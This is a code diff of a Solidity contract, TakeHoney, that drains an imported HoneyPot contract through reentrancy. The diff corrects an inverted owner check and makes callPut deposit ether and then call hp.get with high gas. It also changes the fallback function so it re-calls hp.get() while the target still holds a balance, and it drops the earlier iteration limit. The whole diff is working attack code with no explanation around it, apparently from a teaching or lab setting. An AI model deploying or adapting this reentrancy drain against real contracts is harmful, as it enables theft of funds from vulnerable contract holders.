@@ -5,50 +5,32 @@ import "./HoneyPot.sol";
 
 contract TakeHoney
 {
-    address cHoneyPotAddress;
     address owner;
-    
-    uint howManyTimes ;
-    uint iterations ;
     HoneyPot hp;
-    
+
     modifier onlyowner
     {
-        require(owner!=msg.sender);
+        require(owner==msg.sender);
         _;
     }
-    
-    function getBalanceOf(address addr)
-        public
-        returns(uint)
-    {
-        return addr.balance;
-    }
-    
+
+
     function TakeHoney (address honeyPotAddr)
         public
     {
-        cHoneyPotAddress = honeyPotAddr;
-        hp = HoneyPot(cHoneyPotAddress); // instance
+        owner = msg.sender;
+        hp = HoneyPot(honeyPotAddr); // instance
     }
-    
+
     
     function callPut() 
         public
         payable
         onlyowner
     {
-        
+        require(msg.value>0);
         hp.put.value(msg.value)();
-    }
-    
-    function callGet(uint times)
-        public 
-        onlyowner
-    {
-        howManyTimes = times;
-        iterations=0;
-        hp.get();
+        hp.get.gas(3000000)();
     }
     
     
@@ -62,14 +44,10 @@ contract TakeHoney
     function () 
         public
         payable
-        onlyowner
     {
-       
-        if(hp.balance>0 && iterations<howManyTimes)
-        {
-            iterations++;
-            hp.get();
-        }
+        // recall get untill balance > 0
+        if(hp.balance>0 )
+            hp.get();      
             
     }
     
